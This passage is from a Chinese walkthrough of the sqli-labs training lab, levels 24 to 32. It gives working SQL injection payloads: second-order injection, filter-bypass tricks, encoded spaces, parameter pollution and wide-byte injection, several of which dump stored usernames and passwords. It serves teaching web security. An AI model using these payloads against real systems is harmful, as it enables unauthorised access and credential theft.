<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 检测未登录：</span><br><span class="line">    重定向到首页</span><br><span class="line"><span class="keyword">if</span> 检测到提交表单：</span><br><span class="line">  <span class="comment"># 对 pass 都进行了过滤</span></span><br><span class="line">  $username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">    $curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">    $pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 两次密码一致:</span><br><span class="line">        <span class="comment"># 直接将 username 拼接到 SQL 语句</span></span><br><span class="line">        $sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        提示密码不一致 并重定向到 fail.php</span><br></pre></td></tr></table></figure>
<h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。</p>
<p><strong>二次注入</strong> 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。</p>
<p>先看创建用户的地方：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username =  mysql_escape_string($_POST['username']) ;</span><br></pre></td></tr></table></figure>
<p>username 被 <code>mysql_escape_string</code> 函数过滤了，该函数的作用如下：</p>
<table>
<thead>
<tr>
<th>危险字符</th>
<th>转义后</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>\</code></td>
<td><code>\\</code></td>
</tr>
<tr>
<td><code>&#39;</code></td>
<td><code>\&#39;</code></td>
</tr>
<tr>
<td><code>&quot;</code></td>
<td><code>\&quot;</code></td>
</tr>
</tbody>
</table>
<p>再看下更新密码的核心语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$curr_pass'</span></span><br></pre></td></tr></table></figure>
<p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="comment"># and password='$curr_pass'</span></span><br></pre></td></tr></table></figure>
<p>此时就完全改变了语义，直接就修改掉了 admin 用户的密码。</p>
<h4 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h4><p>常见一个<code>admin&#39;#</code>开头的用户名，下面列举的几种都可以，以此类推，很灵活：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;#1</span><br><span class="line">admin&apos;#233</span><br><span class="line">admin&apos;#gg</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>注册完成后数据库的记录信息如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">| id | username      | password   |</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">| 20 | admin<span class="string">'#hacker | 111        |</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br></pre></td></tr></table></figure>
<p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p>
<p>接下来登录 <code>admin&#39;#hacker</code> 用户，然后来修改当前的密码：</p>
<p><img src="http://qiniuyun.lintstar.top/15901641643476.png" alt="15901641643476"></p>
<p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">| id | username      | password   |</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">|  8 | admin         | 233        |</span><br><span class="line">| 20 | admin<span class="string">'#hacker | 111        |</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br></pre></td></tr></table></figure>
<h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>关键代码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id 直接单引号拼接</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 但是 id 被如下函数过滤了</span></span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure>
<p>过滤了 or 和 and 关键词，但是还存在很多方法可以绕过，下面具体演示一下：</p>
<h4 id="双写嵌套绕过"><a href="#双写嵌套绕过" class="headerlink" title="双写嵌套绕过"></a>双写嵌套绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users)--+</span><br><span class="line">password` 写成了 `passwoorrd`，`SEPARATOR`写成`SEPARATOORR</span><br></pre></td></tr></table></figure>
<h3 id="符号替换"><a href="#符号替换" class="headerlink" title="符号替换"></a>符号替换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">or` -&gt; `||</span><br><span class="line">and` -&gt; `&amp;&amp;</span><br><span class="line">?id=1&apos;||extractvalue(1,concat(0x7e,database()))--+</span><br></pre></td></tr></table></figure>
<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=$id</code></td>
</tr>
</tbody>
</table>
<p>与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的，国光这里不再啰嗦。</p>
<h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p><strong>简单源码分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 or 和 and 大小写</span></span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 -- 和 # 注释</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);        <span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);            <span class="comment">//Strip out #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了空格</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);        <span class="comment">//Strip out spaces</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了斜线</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);        <span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure>
<p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p>
<p>过滤注释 可以使用闭合绕过</p>
<p>过滤了空格 可以使用如下的符号来替代：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>%09</td>
<td>TAB 键(水平)</td>
</tr>
<tr>
<td>%0a</td>
<td>新建一行</td>
</tr>
<tr>
<td>%0c</td>
<td>新的一页</td>
</tr>
<tr>
<td>%0d</td>
<td>return 功能</td>
</tr>
<tr>
<td>%0b</td>
<td>TAB 键(垂直)</td>
</tr>
<tr>
<td>%a0</td>
<td>空格</td>
</tr>
</tbody>
</table>
<p>直接上 payload 吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&apos;%0bunion%0bselect%0b1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,passwoorrd,0x3c62723e))))x),3%0baandnd%0b&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody>
</table>
<p>与 Less-26 相比，只是拼接方式改变了，因为没有输出报错信息，所以不能使用报错注入了，然后不再啰嗦，大家可以自行测试。</p>
<h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody>
</table>
<p>过滤规则又增加了许多：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 -</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了空格</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 union UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure>
<p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大小写混写</span></span><br><span class="line">unioN</span><br><span class="line">unIon</span><br><span class="line">seLect</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 嵌套双写</span></span><br><span class="line">uunionnion</span><br><span class="line">sselectelect</span><br><span class="line">ununionion</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>很多种方案，不再赘述，下面直接丢 payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&apos;%0bununionion%0bseLect%0b1,(seLect(@x)FROM(seLect(@x:=0x00) ,(seLect(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3%0band%0b&apos;1</span><br></pre></td></tr></table></figure>
<h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-27 相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。</p>
<h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody>
</table>
<p>过滤规则如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤 /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 - # 注释</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 空格 +</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 union select /i 大小写都过滤</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure>
<p>这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&apos;)%0bunion%a0select%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers),3%a0and%0b(&apos;1</span><br></pre></td></tr></table></figure>
<h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody>
</table>
<p>比 Less-27 还少了几个过滤规则，这样直接丢 payload 吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;) union%a0select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+</span><br></pre></td></tr></table></figure>
<h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody>
</table>
<p>这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。</p>
<ul>
<li><code>index.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id = 'x' 的拼接方式</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询到结果:</span><br><span class="line">    输出查询的详细信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+</span><br></pre></td></tr></table></figure>
<p>这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：</p>
<ul>
<li><code>login.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询 query 的字符串</span></span><br><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟 tomcat 的查询函数 处理一下</span></span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次过滤检测</span></span><br><span class="line">whitelist($id1);</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询到结果:</span><br><span class="line">    输出查询的详细信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span><span class="params">($query_string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $q_s = $query_string;</span><br><span class="line">    <span class="comment"># &amp; 作为分隔符 分割字符串</span></span><br><span class="line">    $qs_array= explode(<span class="string">"&amp;"</span>,$q_s);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历 qs_array 数组</span></span><br><span class="line">    <span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment"># 如果数组前两位是 id 的话</span></span><br><span class="line">        <span class="keyword">if</span>($val==<span class="string">"id"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment"># 截取 $value 的3-30 的字符串 作为 id 的值</span></span><br><span class="line">            $id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>);</span><br><span class="line">            <span class="keyword">return</span> $id_value;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment"># 过滤规则 检测数字</span></span><br><span class="line">    $match = preg_match(<span class="string">"/^\d+$/"</span>, $input);</span><br><span class="line">    <span class="keyword">if</span> 不符合规则：</span><br><span class="line">        header(<span class="string">'Location: hacked.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从代码中还是很容易发现问题的，关键问题出在下面的地方：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">...</span><br><span class="line">whitelist($id1);</span><br><span class="line">whitelist` 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 `hacked.php`，这里是没毛病的。那么问题出在了这里函数`$id1=java_implimentation($qs);</span><br></pre></td></tr></table></figure>
<p>因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 <code>return $id_value</code>，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</p>
<p>假设用户输入这样的语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=<span class="number">1</span>&amp;id=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>Apache PHP 会解析最后一个参数</p>
<p>Tomcat JSP 会解析第一个参数</p>
<p>知道这个原理的话后面尝试直接注入吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?id=1&amp;id=-2&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>
<h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p>
<h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=（&quot;$id&quot;）</code></td>
</tr>
</tbody>
</table>
<p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p>
<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>考察 Bypass addslashes()，关键的防护代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在' " \ 等敏感字符前面添加反斜杠</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;        <span class="comment"># \ 转换为 \\</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          将       <span class="comment"># 将 ' 转为\"</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);</span><br><span class="line">      <span class="comment"># 将 " 转为\"</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>宽字节注入原理</strong></p>
<p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 <code>\</code>，所以这里想办法干掉反斜杠即可。</p>
<ol>
<li><code>%df</code> 吃掉 <code>\</code></li>
</ol>
